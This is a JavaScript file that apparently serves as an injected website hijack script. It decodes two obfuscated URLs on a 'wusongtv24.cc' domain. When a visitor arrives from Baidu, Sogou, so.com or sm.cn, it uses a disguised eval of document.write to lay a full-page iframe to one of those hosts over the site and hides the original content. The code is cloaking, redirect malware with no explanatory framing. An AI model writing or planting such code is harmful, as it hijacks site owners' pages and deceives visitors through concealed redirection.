var titlestr = document.title;
var arr = ["\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0063\u0064\u006e\u0031\u002e\u0077\u0075\u0073\u006f\u006e\u0067\u0074\u0076\u0032\u0034\u002e\u0063\u0063","\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0063\u0064\u006e\u0032\u002e\u0077\u0075\u0073\u006f\u006e\u0067\u0074\u0076\u0032\u0034\u002e\u0063\u0063"];
var linkIndex = Math.floor((Math.random() * arr.length));
var referer = document.referrer;
var regex=/(baidu\.com|sogou\.com|so\.com|sm\.cn)/i;
if(regex.test(referer))
{
  setFrame(arr[linkIndex]);
}
function setFrame(olink) {
  var ss = '<title>' + titlestr + '</title><div id="showcloneshengxiaon" style="height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;"><ifr' + 'ame scrolling="yes" marginheight=0 marginwidth=0 frameborder="0" width="100%" height="100%" src="' + olink + '"></iframe></div><style type="text/css">html{width:100%;height:100%;}body {width:100%;height:100%;}</style>';
  eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
  try {
    setTimeout(function() {
      console.log(document.body.children.length);
      for (var i = 0; i < document.body.children.length; i++) {
        try {
          var a = document.body.children[i].tagName;
          var b = document.body.children[i].id;
          console.log(i + "***" + a + "**" + b);
          if (b != "iconDiv1" && b != "showcloneshengxiaon" && a != "title") {
            document.body.children[i].style.display = "non" + "e"
          }
        } catch(e) {}
      }
      var oMeta = document.createElement('meta');
      oMeta.name = 'viewport';
      oMeta.content = 'width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no';
      document.getElementsByTagName('head')[0].appendChild(oMeta);
    },
    100)
  } catch(e) {}
}
<!--lg111-->